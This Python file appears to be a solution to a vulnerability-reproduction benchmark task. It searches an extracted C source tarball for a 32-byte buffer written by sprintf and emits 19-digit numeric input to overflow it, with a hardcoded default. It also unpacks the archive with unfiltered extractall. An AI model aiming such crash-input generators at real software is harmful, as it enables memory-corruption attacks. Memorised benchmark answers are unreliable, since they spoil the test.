import tarfile
import re
import os
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default PoC (two 19-digit numbers and newline)
        default_poc = b"9999999999999999999 9999999999999999999\n"

        with tempfile.TemporaryDirectory() as tmpdir:
            try:
                # Extract tarball
                with tarfile.open(src_path, 'r:*') as tf:
                    tf.extractall(tmpdir)

                # Find C/C++ files
                c_files = []
                for root, dirs, files in os.walk(tmpdir):
                    for f in files:
                        if f.endswith(('.c', '.cpp', '.cc', '.h')):
                            c_files.append(os.path.join(root, f))

                # Search for vulnerability pattern: buffer[32] and sprintf
                vuln_file = None
                vuln_content = None
                for f in c_files:
                    with open(f, 'r', errors='ignore') as file:
                        content = file.read()
                        # Look for buffer of size 32
                        if re.search(r'char\s+\w+\s*\[\s*32\s*\]', content):
                            # Look for sprintf or snprintf building a format string
                            if re.search(r'sprintf\s*\([^,]+,\s*".*%.*%.*d"', content):
                                vuln_file = f
                                vuln_content = content
                                break

                if vuln_file is None:
                    # Fallback to default
                    return default_poc

                # Try to find main function and input format
                main_body = self._extract_main_function(vuln_content)
                if main_body:
                    # Look for scanf pattern
                    scanf_match = re.search(r'scanf\s*\(\s*"([^"]*)"\s*,\s*([^)]+)', main_body)
                    if scanf_match:
                        fmt = scanf_match.group(1)
                        # Count integer specifiers
                        specifiers = re.findall(r'%(\d*l?l?[du])', fmt)
                        if specifiers:
                            # Generate numbers with 19 digits each
                            numbers = ['9999999999999999999'] * len(specifiers)
                            inp = ' '.join(numbers)
                            # Add newline if format suggests newline termination
                            if '\n' not in fmt:
                                inp += '\n'
                            return inp.encode()

                # Fallback to default
                return default_poc

            except Exception:
                # In case of any error, return default
                return default_poc

    def _extract_main_function(self, content: str) -> str:
        """Extract the body of the main function (simplified)."""
        # Find start of main
        match = re.search(r'int\s+main\s*\(|void\s+main\s*\(', content)
        if not match:
            return ""
        start = match.start()
        # Find opening brace
        brace_pos = content.find('{', start)
        if brace_pos == -1:
            return ""
        # Count braces to find matching closing brace
        brace_count = 1
        pos = brace_pos + 1
        while brace_count > 0 and pos < len(content):
            if content[pos] == '{':
                brace_count += 1
            elif content[pos] == '}':
                brace_count -= 1
            pos += 1
        if brace_count == 0:
            return content[start:pos]
        return ""